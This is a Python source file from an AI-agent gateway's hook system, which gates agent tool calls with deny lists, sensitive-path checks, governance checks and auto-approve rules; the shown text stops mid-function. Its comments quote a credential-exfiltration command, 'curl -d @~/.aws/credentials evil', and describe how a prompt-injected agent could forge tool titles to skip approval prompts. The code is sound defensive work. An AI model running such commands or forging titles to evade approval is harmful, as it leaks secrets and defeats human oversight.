"""Config-driven hook system for KiroCrew's message pipeline.

Hooks intercept messages and tool calls based on rules in config.json.
Supports declarative rules and executable script hooks with timeout/sandboxing.
"""

from __future__ import annotations

import asyncio
import copy
import errno
import fnmatch
import json
import logging
import os
import stat as _stat
import threading
import time
import uuid
from collections.abc import Iterable, Mapping
from contextlib import contextmanager
from dataclasses import asdict, dataclass, field
from pathlib import Path

from kiro_crew import platform_compat, security, webhooks
from kiro_crew.platform import current_context
from kiro_crew.platform.governance import (
    CU_CLASS_OBSERVE,
    computer_use_action_classes,
    computer_use_action_from_title,
)
from kiro_crew.security import (
    audit_bash_exfiltration,
    is_sensitive_bash_command,
    is_sensitive_path,
    is_sensitive_write_path,
)

logger = logging.getLogger(__name__)


# ── Hook Results ──

# Message hook action constants (backward compat — prefer direct string comparison)
HOOK_PASSTHROUGH = "passthrough"
HOOK_REPLY = "reply"
HOOK_MODIFY = "modify"
HOOK_INJECT_CONTEXT = "inject_context"

# Tool hook action constants
TOOL_ALLOW = "allow"
TOOL_AUTO_APPROVE = "auto_approve"
TOOL_DENY = "deny"

# Script hook events (aligned with Kiro CLI)
HOOK_EVENT_AGENT_SPAWN = "AgentSpawn"
HOOK_EVENT_USER_PROMPT_SUBMIT = "UserPromptSubmit"
HOOK_EVENT_PRE_TOOL_USE = "PreToolUse"
HOOK_EVENT_POST_TOOL_USE = "PostToolUse"
HOOK_EVENT_STOP = "Stop"

HOOK_EVENTS = (
    HOOK_EVENT_AGENT_SPAWN,
    HOOK_EVENT_USER_PROMPT_SUBMIT,
    HOOK_EVENT_PRE_TOOL_USE,
    HOOK_EVENT_POST_TOOL_USE,
    HOOK_EVENT_STOP,
)


@dataclass
class HookResult:
    """Result of running message hooks."""

    action: str  # HOOK_PASSTHROUGH, HOOK_REPLY, HOOK_MODIFY, HOOK_INJECT_CONTEXT
    text: str = ""

    @staticmethod
    def passthrough() -> HookResult:
        return HookResult(action=HOOK_PASSTHROUGH)

    @staticmethod
    def reply(text: str) -> HookResult:
        return HookResult(action=HOOK_REPLY, text=text)

    @staticmethod
    def modify(text: str) -> HookResult:
        return HookResult(action=HOOK_MODIFY, text=text)

    @staticmethod
    def inject_context(text: str) -> HookResult:
        return HookResult(action=HOOK_INJECT_CONTEXT, text=text)


@dataclass
class ToolHookResult:
    action: str  # TOOL_ALLOW, TOOL_AUTO_APPROVE, TOOL_DENY
    reason: str = ""

    @staticmethod
    def allow() -> ToolHookResult:
        return ToolHookResult(action=TOOL_ALLOW)

    @staticmethod
    def auto_approve() -> ToolHookResult:
        return ToolHookResult(action=TOOL_AUTO_APPROVE)

    @staticmethod
    def deny(reason: str) -> ToolHookResult:
        return ToolHookResult(action=TOOL_DENY, reason=reason)


# ── Config Types ──


@dataclass
class ContextRule:
    """Inject context when any trigger keyword matches."""

    triggers: list[str] = field(default_factory=list)
    context: str = ""


@dataclass
class AutoReplyHook:
    """Auto-reply without LLM for pattern matches."""

    pattern: str = ""
    reply: str = ""
    exact: bool = False


@dataclass
class TransformHook:
    """Transform message before sending to LLM."""

    pattern: str = ""
    prefix: str = ""
    suffix: str = ""


_BUNDLED_AUTO_APPROVE_TOOLS: list[str] = [
    "kirocrew browse *",
    "*kirocrew browse *",
]


def _coerce_bool(value: object, default: bool) -> bool:
    """Coerce an operator-editable config value to a bool without ``bool()`` traps.

    ``config.json`` is hand-editable, and plain ``bool("false")`` is ``True`` in
    Python — a footgun that would let ``"disable_all": "false"`` silently turn
    OFF every opt-out-capable protection.  A real bool is returned as-is; a
    recognized string spelling (``true``/``false``/``1``/``0``/``yes``/``no``/
    ``on``/``off``, case-insensitive) maps to its value; anything else falls back
    to *default* (chosen by the caller to fail safe).
    """
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        v = value.strip().lower()
        if v in ("true", "1", "yes", "on"):
            return True
        if v in ("false", "0", "no", "off"):
            return False
    return default


@dataclass
class UserDeniedPattern:
    """A user-authored denied-command pattern (Settings > Security 'add your own')."""

    id: str = ""
    pattern: str = ""
    enabled: bool = True

    @classmethod
    def from_dict(cls, data: dict) -> UserDeniedPattern:
        pid = str(data.get("id", "") or "").strip()
        if not pid:
            pid = uuid.uuid4().hex[:12]
        return cls(
            id=pid,
            pattern=str(data.get("pattern", "") or ""),
            # Default a malformed ``enabled`` to True: a user-authored deny rule
            # is present because the operator wanted it enforced, so ambiguous
            # junk should keep it ON (fail safe = keep denying).
            enabled=_coerce_bool(data.get("enabled", True), default=True),
        )

    def to_dict(self) -> dict:
        return {"id": self.id, "pattern": self.pattern, "enabled": self.enabled}


@dataclass
class HooksConfig:
    """Loaded from config.json ``hooks`` section."""

    auto_approve_tools: list[str] = field(default_factory=list)
    auto_approve_sources: list[str] = field(default_factory=list)
    auto_approve_subagent_spawn: bool = False
    auto_approve_subagent_tools: bool = False
    auto_deny_tools: list[str] = field(default_factory=list)
    auto_replies: list[AutoReplyHook] = field(default_factory=list)
    transforms: list[TransformHook] = field(default_factory=list)
    context_rules: list[ContextRule] = field(default_factory=list)
    # User-configurable denied-command opt-out state (Settings > Security),
    # persisted nested under the ``hooks.denied_commands`` sub-object.
    denied_commands_disabled_ids: list[str] = field(default_factory=list)
    denied_commands_disable_all: bool = False
    denied_commands_user_added: list[UserDeniedPattern] = field(default_factory=list)

    @classmethod
    def from_dict(cls, data: dict) -> HooksConfig:
        """Parse hooks config from a dict (config.json ``hooks`` section).

        ``config.json`` is operator-editable and this method runs at gateway
        boot (``cli_server``/``slack/gateway``), so every field is parsed
        defensively: a malformed scalar/string where a list or list-of-dicts is
        expected (e.g. ``"auto_replies": 1`` or ``"auto_approve_tools": "x"``)
        must degrade to the empty default rather than raise and abort startup.
        """
        if not isinstance(data, dict):
            data = {}

        def _dict_items(key: str) -> list:
            """List of dict entries under *key*; junk (non-list, non-dict items) dropped."""
            raw = data.get(key, [])
            if not isinstance(raw, list):
                return []
            return [h for h in raw if isinstance(h, dict)]

        def _str_list(value) -> list:
            """Non-empty strings from *value* (a list); anything else -> []."""
            if not isinstance(value, list):
                return []
            return [s for s in value if isinstance(s, str)]

        auto_replies = [
            AutoReplyHook(
                pattern=h.get("pattern", ""),
                reply=h.get("reply", ""),
                exact=h.get("exact", False),
            )
            for h in _dict_items("auto_replies")
        ]
        transforms = [
            TransformHook(
                pattern=h.get("pattern", ""),
                prefix=h.get("prefix", ""),
                suffix=h.get("suffix", ""),
            )
            for h in _dict_items("transforms")
        ]
        context_rules = [
            ContextRule(
                triggers=r.get("triggers", []),
                context=r.get("context", ""),
            )
            for r in _dict_items("context_rules")
        ]
        user_approve = _str_list(data.get("auto_approve_tools", []))
        merged_approve = list(dict.fromkeys(_BUNDLED_AUTO_APPROVE_TOOLS + user_approve))
        # Denied-commands opt-out state is stored under a nested sub-object so it
        # can grow independently of the flat top-level hook keys.  config.json is
        # operator-editable, so each nested value is defended against non-list /
        # non-dict junk: a malformed scalar (e.g. ``"user_added": 1``) must not
        # raise at gateway boot — it degrades to "no opt-out" instead.
        dc = data.get("denied_commands", {})
        if not isinstance(dc, dict):
            dc = {}
        raw_user_added = dc.get("user_added", [])
        if not isinstance(raw_user_added, list):
            raw_user_added = []
        user_added = [
            UserDeniedPattern.from_dict(u)
            for u in raw_user_added
            if isinstance(u, dict) and str(u.get("pattern", "") or "").strip()
        ]
        raw_disabled_ids = dc.get("disabled_ids", [])
        if not isinstance(raw_disabled_ids, list):
            raw_disabled_ids = []
        disabled_ids = [str(i) for i in raw_disabled_ids if isinstance(i, str) and i]
        return cls(
            auto_approve_tools=merged_approve,
            auto_approve_sources=_str_list(data.get("auto_approve_sources", [])),
            # Fail safe: malformed auto-approve flags must NOT silently widen
            # approval (a string "false" is truthy under plain bool()) — default
            # to False so ambiguous junk keeps interactive approval on.
            auto_approve_subagent_spawn=_coerce_bool(
                data.get("auto_approve_subagent_spawn", False), default=False
            ),
            auto_approve_subagent_tools=_coerce_bool(
                data.get("auto_approve_subagent_tools", False), default=False
            ),
            auto_deny_tools=_str_list(data.get("auto_deny_tools", [])),
            auto_replies=auto_replies,
            transforms=transforms,
            context_rules=context_rules,
            denied_commands_disabled_ids=disabled_ids,
            # Fail safe: a malformed ``disable_all`` (incl. the string "false",
            # which is truthy under plain bool()) must NOT silently disable every
            # built-in protection — unknown junk defaults to False (denies stay on).
            denied_commands_disable_all=_coerce_bool(dc.get("disable_all", False), default=False),
            denied_commands_user_added=user_added,
        )

    def to_dict(self) -> dict:
        """Serialize hook config for persistence / API round-trip.

        Does NOT re-emit ``_BUNDLED_AUTO_APPROVE_TOOLS`` (they are injected on
        load and would accrete in config.json on every save).  The
        denied-commands opt-out state is written back nested under
        ``denied_commands``.
        """
        return {
            "auto_approve_tools": [
                t for t in self.auto_approve_tools if t not in _BUNDLED_AUTO_APPROVE_TOOLS
            ],
            "auto_approve_sources": list(self.auto_approve_sources),
            "auto_approve_subagent_spawn": self.auto_approve_subagent_spawn,
            "auto_approve_subagent_tools": self.auto_approve_subagent_tools,
            "auto_deny_tools": list(self.auto_deny_tools),
            "auto_replies": [asdict(h) for h in self.auto_replies],
            "transforms": [asdict(h) for h in self.transforms],
            "context_rules": [asdict(r) for r in self.context_rules],
            # The denied-command opt-out state is NOT persisted in config.json's
            # hooks section — it lives in the keystone ``denied_commands.json``
            # (see ``denied_commands_state``/``load_denied_commands_state``). We
            # still surface it here (nested) for the round-trip API + tests, but
            # config.json readers ignore it (the boot path re-sources it from the
            # keystone file).
            "denied_commands": self.denied_commands_state(),
        }

    def denied_commands_state(self) -> dict:
        """The opt-out state as the keystone ``denied_commands.json`` object."""
        return {
            "disabled_ids": list(self.denied_commands_disabled_ids),
            "disable_all": self.denied_commands_disable_all,
            "user_added": [p.to_dict() for p in self.denied_commands_user_added],
        }


# ── HookManager ──


class HookManager:
    """Process messages and tool calls through config-driven rules."""

    def __init__(self, config: HooksConfig | None = None):
        self._config = config or HooksConfig()

    def reload(self, config: HooksConfig) -> None:
        """Hot-reload hooks config."""
        self._config = config

    @property
    def auto_approve_subagent_spawn(self) -> bool:
        return self._config.auto_approve_subagent_spawn

    @property
    def auto_approve_subagent_tools(self) -> bool:
        return self._config.auto_approve_subagent_tools

    # ── Message hooks ──

    def on_message(self, text: str) -> HookResult:
        """Run message hooks. Returns first match or passthrough."""
        lower = text.lower()

        # Auto-replies (first match wins)
        for ar_hook in self._config.auto_replies:
            if ar_hook.exact:
                if lower == ar_hook.pattern.lower():
                    return HookResult.reply(ar_hook.reply)
            else:
                if ar_hook.pattern.lower() in lower:
                    return HookResult.reply(ar_hook.reply)

        # Transforms (first match wins)
        for tf_hook in self._config.transforms:
            if tf_hook.pattern.lower() in lower:
                modified = text
                if tf_hook.prefix:
                    modified = f"{tf_hook.prefix}\n{modified}"
                if tf_hook.suffix:
                    modified = f"{modified}\n{tf_hook.suffix}"
                return HookResult.modify(modified)

        # Context injection (all matching rules)
        injected: list[str] = []
        for rule in self._config.context_rules:
            if any(t.lower() in lower for t in rule.triggers):
                injected.append(rule.context)
        if injected:
            return HookResult.inject_context("\n\n".join(injected))

        return HookResult.passthrough()

    # ── Tool hooks ──

    def on_tool_call(
        self,
        tool_name: str,
        *,
        session_key: str = "",
        agent: str = "",
        app: str = "",
        tool_kind: str = "",
        raw_params: dict | None = None,
        command: str | None = None,
        is_shell: bool = False,
        mcp_server_name: str = "",
        mcp_tool_name: str = "",
        resolved_agent: str = "",
    ) -> ToolHookResult:
        """Check if a tool should be auto-approved, denied, or handled normally.

        ``tool_name`` is the display title/pill label. For shell tools it may
        be an LLM-authored ``description`` string rather than the literal
        command (``select_tool_title`` in ``acp/_dispatch.py`` prefers
        ``description`` over ``command``), so it is UNTRUSTED for security
        decisions. When the caller has the raw executable command it MUST pass
        it as ``command=``; every security check then also runs against the
        real command, closing the bypass where a benign title/description hid
        a dangerous command (``auto_deny_tools`` and the sensitive-path /
        credential-read protections both keyed off the title otherwise).
        Over-blocking is the safe direction: a match on EITHER the title or the
        command denies. Auto-approve stays keyed on the title only — failing to
        auto-approve merely falls through to interactive approval.

        The optional keyword-only ``session_key`` / ``agent`` / ``app`` identify
        the calling surface so the governance ceiling ∩ active-profile can be
        resolved and a tool/MCP call denied even when the kiro agent config
        granted it (the governance headline behavior).  They default to ``""`` so
        every existing caller is unaffected; a caller that supplies identity opts
        into per-surface governance.

        ``tool_kind`` (the ACP semantic kind: ``read``/``edit``/``fetch``/…) and
        ``raw_params`` (the real tool arguments — ``path``/``url``) let the gate
        enforce the path/host scopes a display title cannot carry
        (``filesystem.write``, ``network.egress``).  Both default to empty, so a
        caller that does not thread them only loses those two arg-derived scopes,
        never the title-derived ones.

        ``is_shell`` enforces deny-by-default for shell tools: when a caller
        reports a shell tool (``is_shell=True``) but cannot supply the raw
        ``command`` (extraction failed — e.g. malformed params), the title
        alone is not a trustworthy basis for a decision, so the call is DENIED
        rather than silently falling through to the title-only checks. Callers
        that always pass a resolved command can leave ``is_shell`` at its
        default; those forwarding an event should pass both the command and the
        event's ``is_shell`` flag.

        ``mcp_server_name`` is the NON-model-authored MCP server identity from
        the ACP event's ``_meta.kiro.mcpServerName`` (``AcpEvent.mcp_server_name``),
        set by kiro-cli ONLY for MCP-served tool calls and empty for shell /
        built-in tools. It is the trusted discriminator "this call was genuinely
        served by MCP server X" — as opposed to the LLM-authored ``tool_name``
        title, which a prompt-injected agent can forge (e.g. titling a Bash call
        ``mcp__<app>:srv__x``). The app-own-server auto-approve keys on THIS, never
        on the title, so a forged title cannot win an auto-approval. Empty (the
        default, or a backend that omits ``_meta.kiro``) fails closed: no match.

        ``mcp_tool_name`` is the sibling NON-model-authored tool identity from
        ``_meta.kiro.toolName`` (``AcpEvent.tool_name``), set by kiro-cli
        alongside ``mcp_server_name`` for MCP-served calls. It is used to
        reconstruct the canonical ``mcp__<server>__<tool>`` name and govern the
        REAL tool before the app-own-server auto-approve — because the ``tool_name``
        title above is LLM-authored prose (``select_tool_title`` prefers the
        model's ``description``) and may not carry the canonical form a per-tool
        MCP policy matches on. Empty (no ``_meta.kiro.toolName``) means the tool
        cannot be identified for governance, so the own-server auto-approve does
        NOT fire (fall through to interactive approval — fail-closed).
        """
        # Deny-by-default: a shell tool whose command could not be recovered
        # must not be evaluated on the untrusted title alone — that is the very
        # bypass this gate closes. Reject instead of falling through.
        if is_shell and not command:
            return ToolHookResult.deny(
                "Blocked: shell command could not be verified for security "
                "policy (deny-by-default)"
            )

        # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
        # patterns like "ls" or "rm *" match without the prefix.
        normalized = _normalize_tool_name(tool_name)

        # Security checks run against the raw command (when available) AND the
        # display title. The command is the ground truth for shell tools; the
        # title is retained so non-shell tools (whose identifier IS the title)
        # stay gated and so a dangerous title can't slip through behind a
        # benign command.
        security_targets = [normalized]
        if command and command not in security_targets:
            security_targets.append(command)

        # Sensitive path protection (always enforced, before all other checks).
        # kiro-cli adds "Reading "/"Running: " display prefixes; the
        # claude-agent-acp adapter does NOT (its file-read title is the bare
        # path, its Bash title the bare command). So the prefix only HINTS at
        # the tool kind — we must run every check on every target regardless of
        # prefix, or credential reads slip through on the Claude Code provider.
        # Each target is the normalized title AND (for shell tools) the raw
        # command, so an LLM-authored benign title can't hide a dangerous
        # command from any of these gates. is_sensitive_path resolves the value
        # as a path: a real file-read title ("~/.aws/credentials") matches,
        # while a bash command ("cat ~/.aws/credentials") resolves to a
        # non-sensitive path and is instead caught by is_sensitive_bash_command.
        for target in security_targets:
            if is_sensitive_path(target):
                return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
            # execute_bash (prefixed or bare) — check for reads of sensitive paths.
            reason = is_sensitive_bash_command(target)
            if reason:
                return ToolHookResult.deny(reason)
            # Data-exfiltration / reverse-shell command shapes.
            # The anti-exfil patterns previously lived only in the passive audit
            # path (scan_history / dashboard count) and were never enforced at
            # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
            # evil` or open a reverse shell unblocked. Deny them at the gate —
            # against the raw command too, not just the title.
            reason = audit_bash_exfiltration(target)
            if reason:
                return ToolHookResult.deny(reason)
        # The display title is backend-variable and may NOT carry the path (an
        # "Editing <file>" / generic "code" title does not). The real path lives
        # in raw_params['path'] for file read/edit tools — run the SAME always-on
        # keystone on it so an edit/write to ~/.ssh, ~/.aws, or the governance
        # trust-root files (security_policy.json / profiles) is blocked even when
        # the title hides it. This is the keystone the governance model leans on
        # (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated.
        if raw_params:
            real_path = raw_params.get("path") or raw_params.get("file_path")
            if isinstance(real_path, str) and real_path and is_sensitive_path(real_path):
                return ToolHookResult.deny(f"Blocked: access to sensitive path: {real_path}")
        # Config files are WRITE-protected (reads stay allowed): block the agent's
        # file-EDIT tool from modifying config.json / config.local.json so a
        # prompt-injected agent cannot rewrite its own resource ceilings
        # (concurrent subagents, turn budget, warm-pool size) to drive host
        # resource exhaustion. Gated
        # on the ACP ``edit`` kind (the fs_write/code tool) so a plain read of
        # config is unaffected — the dashboard file viewer, ``cat``, and knowledge
        # indexing legitimately read config.json. Bash writes (``tee``/``>``/
        # ``cp``-dest) are blocked separately by ``is_sensitive_bash_command``
        # above; this branch covers the file-EDIT tool.
        #
        # Empty/unknown ``tool_kind`` (the ACP kind field is spec-optional; some
        # backends omit it) is DELIBERATELY not mirrored here.
        # ``governance._scopes_for_call`` (platform/governance.py) infers BOTH
        # filesystem.read AND filesystem.write from a lone ``path`` when the kind
        # is empty, because it is a *policy intersection* where an ungoverned
        # scope permits. This gate is a HARD deny, so applying that same shape
        # inference would also block legitimate config READS that arrive without a
        # kind — regressing the read-allowance that is the whole point of the
        # write-only tier. Empty-kind edits are rare (the ACP fs_write tool sets
        # ``edit``); not hard-denying them keeps the two write-gates from drifting
        # into a read regression, and the bash gate covers the shell surface.
        if tool_kind == _EDIT_TOOL_KIND and raw_params:
            wpath = raw_params.get("path") or raw_params.get("file_path")
            if isinstance(wpath, str) and wpath and is_sensitive_write_path(wpath):
                return ToolHookResult.deny(
                    f"Blocked: modification of write-protected config path: {wpath}"
                )
        # Built-in security deny list (always enforced).  Route through the
        # active PlatformContext's PolicyAuthority so the Amazon companion's
        # ADD-only deny overlay (+ internal patterns) applies when loaded.  The
        # standalone Default authority uses an empty overlay, so this resolves
        # to ``security.is_denied(name, auto_deny_tools)`` exactly as before —
        # no recursion (PolicyAuthority.is_denied calls security.is_denied with
        # the overlay patterns appended; security.is_denied never calls back).
        # Check the raw command (ground truth) as well as the normalized and
        # original title forms.
        ctx = current_context()
        authority = ctx.security
        denied_regexes = self._effective_denied(ctx)
        deny_targets = [normalized, tool_name]
        if command:
            deny_targets.append(command)
        for target in deny_targets:
            reason = authority.is_denied(
                target, self._config.auto_deny_tools, denied_regexes=denied_regexes
            )
            if reason:
                return ToolHookResult.deny(reason)

        # Governance ceiling ∩ active profile (Level 1 ∩ Level 2).  Runs BEFORE
        # the auto-approve loop so a governance deny wins over a user
        # auto-approve and is never bypassed.  This is the layer that denies a
        # tool/MCP call even when the kiro agent config granted it: the title for
        # an MCP tool arrives as ``mcp__server__tool`` and is governed by name
        # here regardless of kiro's allowedTools.  No-op on a standalone host
        # with no policy and no bound profile (gate_decision permits), so today's
        # behavior is preserved unless governance is configured.
        gov_reason = _governance_denial(
            ctx, tool_name, session_key, agent, app, tool_kind, raw_params
        )
        if gov_reason:
            return ToolHookResult.deny(gov_reason)

        # App-own MCP server auto-approve — a FIRST-PARTY (builtin) app agent
        # calling its OWN app-scoped MCP server is intra-app, not a host surface.
        # A builtin app's declared server is registered under the
        # ``<app>:<server>`` key (see ``apps/bridges.py``) and IS the gateway's
        # own shipped code, so it only touches the app's own data — never
        # fs/network/exec/exfil on the host. Once a shipped app agent stopped
        # pre-authorizing tools (no template ``allowedTools``, the "no template
        # pre-authorizes tools" invariant), even those intra-app calls fell
        # through to an interactive prompt the user could not meaningfully act on
        # (the app was blocked from talking to itself). Auto-approving them here
        # restores that UX without re-widening any host grant.
        #
        # Keyed on the NON-model-authored ``mcp_server_name`` (the ACP
        # ``_meta.kiro.mcpServerName``), NEVER on the LLM-authored title: a
        # prompt-injected agent can title a Bash call ``mcp__<app>:srv__x``, but
        # kiro-cli only sets ``mcp_server_name`` for a genuine MCP-served call, so
        # a forged shell/host title carries an empty server name and never
        # matches (fail-closed). Restricted to builtins on purpose: only a
        # builtin's server is provably first-party. A THIRD-PARTY app's server is
        # arbitrary installed code whose internals the gate cannot see, so its
        # own-server calls are NOT auto-approved here — the OS sandbox it runs
        # under and the third-party admission gate bound its behavior instead.
        #
        # Placed AFTER the always-on deny floor and ``_governance_denial`` so a
        # ceiling/profile can still deny even a builtin's own server and every
        # sensitive-path / keystone / exfil deny above still wins; and BEFORE the
        # interactive fall-through, independent of the Normal/Read/Trust tier
        # (that tier governs the HOST tools an app agent may reach, not the app
        # talking to its own server). Generic App Kit contract keyed only on the
        # ``<app>:<server>`` convention + shipped-manifest provenance — no per-app
        # special-casing.
        #
        # ``_app_owns_mcp_server`` only proves the NAME is ``<app>:``-prefixed;
        # ``_own_mcp_servers`` (bridges.py) injects app servers into the agent by
        # reading that prefix from the MUTABLE global MCP config, so a
        # ``<app>:evil`` entry that landed there (not declared by the app) would
        # otherwise be trusted. Require the server to be DECLARED in the app's
        # SHIPPED manifest (``_is_declared_builtin_mcp_server``, an in-memory set
        # warmed at boot from immutable manifests — same discipline as
        # ``_BUILTIN_APP_NAMES``) so only a genuinely app-own server auto-approves.
        #
        # Recover an app identity for a builtin whose slot carries NONE. Only a
        # request with an authenticated app scope sets ``Slot._app``, so a
        # builtin whose UI is not an app iframe (an Electron window using the
        # dashboard session cookie) binds its slot with an empty app and every
        # condition below keyed on it fails — the app could not talk to its own
        # server. Prefer the slot's own ``app`` whenever it HAS one, so an
        # app-scoped session behaves exactly as before; the derived value is used
        # ONLY for this auto-approve and is never written back to the slot (see
        # ``_builtin_app_for_agent`` — ``_app`` also drives app isolation).
        #
        # Keyed on ``resolved_agent`` (what ACTUALLY ran), NEVER on ``agent``:
        # the latter is the slot's ALIAS, which ``resolve_agent_bindings`` maps to
        # a concrete kiro agent before dispatch, so a user-defined alias named
        # after a builtin's agent could otherwise borrow that app's identity for
        # a completely different runtime agent. An empty ``resolved_agent`` (an
        # uncached permission event, or a caller that does not thread it through)
        # yields no identity — fail-closed to interactive approval.
        owner_app = app or _builtin_app_for_agent(resolved_agent)
        if (
            _app_owns_mcp_server(mcp_server_name, owner_app)
            and _is_first_party_app(owner_app)
            and _is_declared_builtin_mcp_server(mcp_server_name)
        ):
            # Govern the REAL tool by its TRUSTED _meta.kiro identity before
            # granting the intra-app auto-approve. ``select_tool_title`` prefers
            # the model's prose ``description``, so ``tool_name`` (and thus the
            # ``_governance_denial`` above) may not carry the canonical
            # ``mcp__server__tool`` a per-tool policy matches on — a ceiling /
            # profile that denies ONE tool of this server would otherwise be
            # skipped here and the tool auto-executed. Reconstruct the canonical
            # title from the NON-model-authored server + tool names (mirroring
            # the ``mcp__<server>__<tool>`` form ``mcp_title_to_ref`` parses) and
            # re-check governance. A missing trusted tool name (a backend without
            # ``_meta.kiro.toolName``, or an uncached permission event) means we
            # cannot prove WHICH tool this is, so we do NOT auto-approve — fall
            # through to interactive approval (fail-closed), never silent execute.
            if mcp_tool_name:
                canonical_mcp_name = f"mcp__{mcp_server_name}__{mcp_tool_name}"
                # Re-apply the always-on deny floor to the canonical name too:
                # the top-of-method ``authority.is_denied`` ran against the prose
                # title / command, so a configured deny rule (``auto_deny_tools``
                # or a denied regex) keyed on the canonical ``mcp__server__tool``
                # would have MISSED — and this auto-approve must never re-admit a
                # tool the deny floor forbids. Mirrors the governance re-check.
                deny_reason = authority.is_denied(
                    canonical_mcp_name,
                    self._config.auto_deny_tools,
                    denied_regexes=denied_regexes,
                )
                if deny_reason:
                    return ToolHookResult.deny(deny_reason)
                gov_reason = _governance_denial(
                    ctx, canonical_mcp_name, session_key, agent, app, tool_kind, raw_params
                )
                if gov_reason:
                    return ToolHookResult.deny(gov_reason)
                return ToolHookResult.auto_approve()

        # Auto-approve — match against both the original title (preserves
        # "Running: "/"Reading " prefixes) and the normalized name (stripped)
        # so that "Running: *" and bare tool-name patterns both work.
        for pattern in self._config.auto_approve_tools:
            if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
                return ToolHookResult.auto_approve()

        # KiroCrew-side read-only auto-approve — the LAST branch before allow(),
        # AFTER every early-return deny (deny-by-default shell, sensitive-path,
        # sensitive-bash, exfil, write-protected-config, the effective deny set,
        # and governance). Its position guarantees a read-only classification can
        # never re-admit anything the gates above blocked. This re-homes the
        # "reads don't nag" UX now that kiro-cli's autoAllowReadonly is retired.
        # Imports are function-local: slack.gateway imports hooks at module top,
        # so a top-level import here would create a boot import cycle.
        if is_shell:
            # A shell read-only classification uses the deny-by-default bash
            # classifier (rejects redirects/substitution/backgrounding). When the
            # command could not be recovered we already denied above; a present
            # command that is not read-only falls through to interactive approval.
            from kiro_crew.dashboard.state import is_read_only_bash

            if command and is_read_only_bash(command):
                return ToolHookResult.auto_approve()
        else:
            from kiro_crew.slack.gateway import _is_read_only_tool

            kind = (tool_kind or "").strip().lower()
            # Trust the SEMANTIC kind, as an ALLOW-list. `tool_kind` is passed
            # through verbatim from the ACP `kind` field (``acp/_dispatch.py``), so it
            # is an arbitrary agent-influenced string and a DENYLIST of mutating kinds
            # can never be complete — `kind="other"` is a real ACP value. Only these
            # two spellings mean "this cannot change anything".
            if kind in _READ_ONLY_TOOL_KINDS:
                return ToolHookResult.auto_approve()
            # Computer-use observation tools ("reads don't nag" for this feature too),
            # and they require an EXPLICIT read-only kind — reached only under the
            # branch above. Two agent-controlled inputs meet here and neither may
            # decide alone:
            #
            #   * `tool_name` comes from `select_tool_title`, which prefers the
            #     LLM-authored `description`, so a mutating call can title itself
            #     `…__computer_get_state`;
            #   * an omitted `kind` is indistinguishable from an honest one.
            #
            # Keying the class lookup on the title alone therefore let a `computer_click`
            # forge an observation title, omit its kind, and skip the approval prompt
            # entirely once the operator enabled computer use — the prompt that is the
            # last thing between an injected agent and a real click on the operator's
            # desktop. Demanding the kind means the two inputs must AGREE.
            #
            # The class table is still consulted (never `_is_read_only_tool`, whose
            # leading-verb heuristic would auto-approve every `computer_*` tool or none
            # depending on the name), and it is still gated on the keystone primary
            # enable so no auto-approval can exist while the feature is off. Reached
            # only AFTER the deny floor and `_governance_denial`, so a governance deny
            # still wins. There is deliberately no approval-floor clamp to mention: the
            # `computer_use.approval` ordinal was removed with the rest of that model.
            if kind in _READ_ONLY_TOOL_KINDS and _cu_read_only_auto_approve(tool_name):
                return ToolHookResult.auto_approve()
            # Any other non-empty kind falls through to interactive approval, whatever
            # the call titles itself. Over-blocking costs one prompt; under-blocking
            # costs the prompt.
            if kind:
                return ToolHookResult.allow()
            # Kind ABSENT: the pre-existing generic fallback, unchanged. It is safe for
            # computer use specifically because `_is_read_only_tool` matches on a
            # leading read-ish verb and rejects EVERY `mcp__kirocrew-computer__*` title
            # (verified) — so a forged computer-use title cannot reach an auto-approve
            # through this path either.
            if _is_read_only_tool(tool_name):
                return ToolHookResult.auto_approve()

        return ToolHookResult.allow()

    def _effective_denied(self, ctx: object) -> list[str]:
        """Resolve the effective regex-tier denied set for this call.

        Combines the still-enabled built-in rules (after applying
        ``disable_all`` / ``disabled_ids``, with governance-pinned rule ids
        force-re-added) with the user's own enabled ``user_added`` regexes. The
        result is passed to ``authority.is_denied(..., denied_regexes=)``; the
        glob-tier ``auto_deny_tools`` still travel through ``extra_patterns``.
        """
        return resolve_effective_denied_regexes(self._config, ctx)

    def effective_denied_regexes(self) -> list[str]:
        """Public accessor for the effective regex-tier denied set.

        Resolves the platform context itself, so callers outside the tool-call
        gate (e.g. ``llm_helpers._resolve_permission`` on the cron / Slack /
        workflow / heartbeat surfaces) can honor the SAME user opt-out +
        governance-pin state that ``on_tool_call`` enforces, instead of failing
        closed to all built-ins and re-introducing "disabled but still blocked".
        """
        return self._effective_denied(current_context())


# ACP semantic tool kinds treated as read-only for the non-shell auto-approve
# branch. Deliberately minimal — excludes "search"/"edit"/"execute"/"delete"/
# "move"; add conservatively (auto-approving trusts an agent-supplied field).
_READ_ONLY_TOOL_KINDS: frozenset[str] = frozenset({"read", "fetch"})

# Semantic kinds known to mutate/execute. DOCUMENTATION ONLY — the gate no longer
# branches on this set, and must not start again: `tool_kind` arrives verbatim from
# the ACP `kind` field, so any denylist of mutating kinds is incomplete by
# construction (`kind="other"` is a real value that a denylist auto-approved). The
# auto-approve decision is an ALLOW-list on `_READ_ONLY_TOOL_KINDS` instead, and
# every other non-empty kind falls through to interactive approval.
#
# Kept because it records which kinds we have actually seen mutate — useful when
# judging whether a new kind belongs in the read-only set — and because deleting a
# named constant is how the next reader loses that context.
_WRITE_TOOL_KINDS: frozenset[str] = frozenset(
    {"edit", "execute", "delete", "move", "write", "create"}
)


def _governance_pinned_command_ids(ctx: object) -> set[str]:
    """Return built-in command rule ids force-pinned by the active governance ceiling.

    Reads the boot-frozen ceiling (``ctx.governance``) ``commands``-scope deny
    patterns and maps the ones that pin a built-in rule to that rule's id, so
    ``_effective_denied`` can force-re-enable them even when the user opted out
    (tightest-wins). Returns ``set()`` on a standalone/ungoverned host.

    Fail-soft, mirroring ``_governance_denial``: a ``PlatformCompositionError``
    (a non-standalone host that could not compose) propagates fail-closed; any
    other error degrades to an empty set so a transient governance glitch cannot
    wedge every tool call out of ``_effective_denied``. The enterprise force-pin
    is also independently enforced by ``_governance_denial``'s commands-scope
    deny plane, so pins here are belt-and-suspenders.
    """
    from kiro_crew.platform.context import PlatformCompositionError

    try:
        return security.pinned_builtin_command_ids()
    except PlatformCompositionError:
        raise
    except Exception:
